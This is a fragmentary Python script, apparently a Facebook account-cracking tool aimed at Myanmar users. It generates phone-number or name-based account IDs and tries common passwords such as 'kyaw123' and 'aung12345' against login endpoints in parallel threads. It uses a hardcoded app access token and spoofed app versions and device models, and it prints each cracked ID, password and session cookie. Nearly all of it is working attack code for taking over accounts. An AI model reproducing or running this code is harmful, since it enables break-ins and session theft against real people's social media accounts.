...
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 0945,0975,0965,0995')
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=3) as Lover:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'kyawkyaw','kyaw123','kyaw12345','kyawaung','aungaung','aung12345','aung123','aungaung12345']
				if pcs in ['2','02']:
					passlist = [psx,ids,'kyawkyaw','kyaw123','kyaw12345','kyawaung','aungaung','aung12345','aung123','aungaung12345']
				elif pcs in ['3','03']:
					passlist = [psx,ids,'kyawkyaw','kyaw123','kyaw12345','kyawaung','aungaung','aung12345','aung123','aungaung12345']
...
def gmail():
		...
		clear()
		print('\033[1;37m example: myozaw, aungwin, mayzin, thethtar\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;37m example: zawwin, myatthuzar, khinmaroo \033[1;97m')
		linex()
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;31m [Lover-M1] %s|\033[1;32mOK:-%s \033[1;39m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;35m [Lover-M2] %s|\033[1;35mOK:-%s \033[1;35m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;35m [Lover-M3] %s|\033[1;35mOK:-%s \033[1;35m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;35m [Lover-OK] '+ids+' | '+pas+'\033[1;35m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write((loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api8(ids,names,passlist):
	...
	loop+=1
#method1rnd
def Love1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;31m [TRT-M1] %s|\033[1;32mOK:-%s \033[1;39m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;31m [Lover-CP] '+str(uid)+' | '+pas+'\033[1;39m')
...
def Lover2(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;31m [Lover-M2] %s|\033[1;32mOK:-%s \033[1;39m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
...
def Lover3(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;31m [Lover-M3] %s|\033[1;32mOK:-%s \033[1;39m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
